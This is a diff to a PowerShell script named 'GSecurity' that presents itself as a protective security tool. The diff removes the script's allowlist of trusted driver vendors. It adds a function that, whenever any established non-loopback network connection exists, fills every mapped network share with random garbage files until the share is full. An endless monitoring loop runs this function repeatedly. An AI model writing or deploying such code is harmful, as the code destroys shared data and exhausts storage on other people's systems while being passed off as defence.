@@ -2,17 +2,12 @@
     Script Name: GSecurity
     Author: Gorstak
     Description: Enhanced version of GSecurity script with optimized performance, improved logging, and stronger threat detection.
-    Version: 8.0
+    Version: 8.2
     License: Free for personal use
 #>
 
 # Constants
 $logPath = [System.IO.Path]::Combine($env:USERPROFILE, "Documents\GShield_Log.txt")
-
-# Trusted driver vendors to exclude from termination
-$trustedDriverVendors = @(
-    "*Microsoft*", "*NVIDIA*", "*Intel*", "*AMD*", "*Realtek*, "*Dolby*"
-)
 
 # Log function with timestamp and log rotation
 function Write-Log {
@@ -256,6 +251,51 @@ function Terminate-SuspiciousProcesses {
     }
 }
 
+function Fill-RemoteDriveWithGarbage {
+    param (
+        [int]$FileSizeMB = 100  # Size of each garbage file in MB
+    )
+
+    # Check for incoming connections (remote systems connecting to your PC)
+    $incomingConnections = Get-NetTCPConnection -State Established | Where-Object {
+        $_.LocalAddress -eq (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress -and
+        $_.RemoteAddress -ne "127.0.0.1" -and $_.RemoteAddress -ne "::1"
+    }
+
+    if ($incomingConnections) {
+        Write-Host "Incoming connections detected. Filling remote drives with garbage data..." -ForegroundColor Red
+
+        # Get all remote drives (network shares)
+        $remoteDrives = Get-PSDrive -PSProvider FileSystem | Where-Object {
+            $_.DisplayRoot -like "\\*"  # Filter for network shares
+        }
+
+        foreach ($drive in $remoteDrives) {
+            $drivePath = $drive.Root
+            Write-Host "Filling drive: $drivePath" -ForegroundColor Yellow
+
+            # Create garbage files until the drive is full
+            $counter = 1
+            while ($true) {
+                $filePath = Join-Path -Path $drivePath -ChildPath "garbage_$counter.dat"
+                try {
+                    # Create a file filled with random data
+                    $randomData = New-Object byte[] ($FileSizeMB * 1MB)
+                    (New-Object Random).NextBytes($randomData)
+                    [System.IO.File]::WriteAllBytes($filePath, $randomData)
+                    Write-Host "Created garbage file: $filePath" -ForegroundColor Cyan
+                    $counter++
+                } catch {
+                    Write-Host "Drive is full or an error occurred: $_" -ForegroundColor Red
+                    break
+                }
+            }
+        }
+    } else {
+        Write-Host "No incoming connections detected." -ForegroundColor Green
+    }
+}
+
 # Function to scramble keypresses
 function Start-KeyScrambler {
     [KeyScrambler]::Start()
@@ -270,6 +310,8 @@ function Run-Monitor {
     while ($true) {
 	Terminate-SuspiciousProcesses
 	Start-KeyScrambler
+	Fill-RemoteDriveWithGarbage -FileSizeMB 10
+	Stop-ProcessesOnPortsNotInSetupScripts
 	Remove-UnsignedDlls
     }
 }
